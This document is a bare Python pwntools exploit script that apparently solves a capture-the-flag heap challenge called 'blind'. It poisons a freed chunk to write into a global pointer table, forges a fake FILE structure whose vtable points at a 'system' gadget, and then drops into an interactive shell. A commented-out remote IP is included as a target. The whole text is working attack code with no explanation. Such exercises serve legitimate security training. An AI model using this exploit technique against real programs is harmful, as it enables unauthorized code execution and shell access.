
from pwn import *
context.log_level='debug'

#p=remote('106.75.20.44', 9999)
p = process('./blind')
elf = ELF('./libc.so.6')

def new(idx,content):
    p.sendline('1')
    p.recvuntil('Index:')
    p.sendline(str(idx))
    p.recvuntil('Content:')
    p.send(content)
    p.recvuntil('Choice:')

def change(idx,content):
    p.sendline('2')
    p.recvuntil('Index:')
    p.sendline(str(idx))
    p.recvuntil('Content:')
    p.send(content)
    p.recv()

def delete(idx):
    p.sendline('3')
    p.recvuntil('Index:')
    p.sendline(str(idx))
    p.recvuntil('Choice:')

system_addr =  0x4008E3

new(0,'a\n')
new(1,'b\n')
delete(0)

gdb.attach(p)
change(0,p64(0x60203d)+'\n')

#gdb.attach(p)

payload = 'a'*0x13 + p64(0x602020)+p64(0x602090)+ p64(0x602090+0x68)+ p64(0x602090+0x68*2) + p64(0x602090+0x68*3)+'\n'
new(2,'a\n')
new(3,payload)

gdb.attach(p)
fake_struct = p64(0x00000000fbad8000) + p64(0x602060)*7 + p64(0x602061) + p64(0)*4  
fake_struct +=  p64(0x602060) + p64(0x1)  + p64(0xffffffffffffffff) + p64(0)
fake_struct += p64(0x602060) + p64(0xffffffffffffffff) + p64(0) + p64(0x602060) 
fake_struct +=  p64(0)*3 + p64(0x00000000ffffffff) + p64(0)*2 +  p64(0x602090 + 0x68*3)
fake_vtable = p64(system_addr)*10

change(1,fake_struct[:0x68])
change(2,fake_struct[0x68:0xd0])
change(3,fake_struct[0xd0:]+'\n')
change(4,fake_vtable+'\n')

gdb.attach(p)
change(0,p64(0x602090)+'\n')

p.interactive()

